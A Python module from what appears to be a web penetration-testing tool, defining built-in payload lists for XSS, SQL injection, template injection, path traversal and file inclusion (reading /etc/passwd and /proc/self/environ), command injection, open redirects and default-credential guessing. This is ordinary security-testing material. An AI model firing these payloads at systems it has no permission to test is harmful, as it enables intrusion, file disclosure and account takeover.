#------------------------------------------------------------------------------
# Wyrm — wyrm/security/payloads.py
# Copyright (c) 2023-present ByKh R&D Group. Licensed under the MIT License (see LICENSE).
# Authors: Oda, Sopi, Kwan
#------------------------------------------------------------------------------
"""Built-in payload lists and generators for Intruder (quick, curated — not exhaustive wordlists)."""
from __future__ import annotations

LISTS = {
    "XSS (quick)": ["<script>alert(1)</script>", "\"'><svg onload=alert(1)>", "'\"><img src=x onerror=alert(1)>",
                    "javascript:alert(1)", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>"],
    "SQL injection (quick)": ["'", "\"", "' OR '1'='1", "' OR 1=1-- -", "') OR ('1'='1", "' UNION SELECT NULL-- -",
                              "1' AND SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -"],
    "SSTI": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}"],
    "Path traversal": ["../../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                       "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
    "LFI / files": ["/etc/passwd", "../../../../etc/passwd", "C:\\windows\\win.ini", "/proc/self/environ",
                    "php://filter/convert.base64-encode/resource=index.php"],
    "Command injection": [";id", "|id", "&&id", "`id`", "$(id)", "; sleep 5", "| ping -n 5 127.0.0.1"],
    "Open redirect": ["https://evil.example/", "//evil.example/", "/\\evil.example", "https:evil.example"],
    "Common usernames": ["admin", "administrator", "root", "test", "user", "guest", "operator", "support", "demo"],
    "Common passwords": ["admin", "password", "123456", "admin123", "root", "changeme", "letmein", "P@ssw0rd",
                         "welcome", "qwerty", "password1"],
}


def numbers(a: int, b: int, step: int = 1) -> list[str]:
    if step == 0:
        step = 1
    rng = range(a, b + 1, step) if step > 0 else range(a, b - 1, step)
    return [str(i) for i in rng]
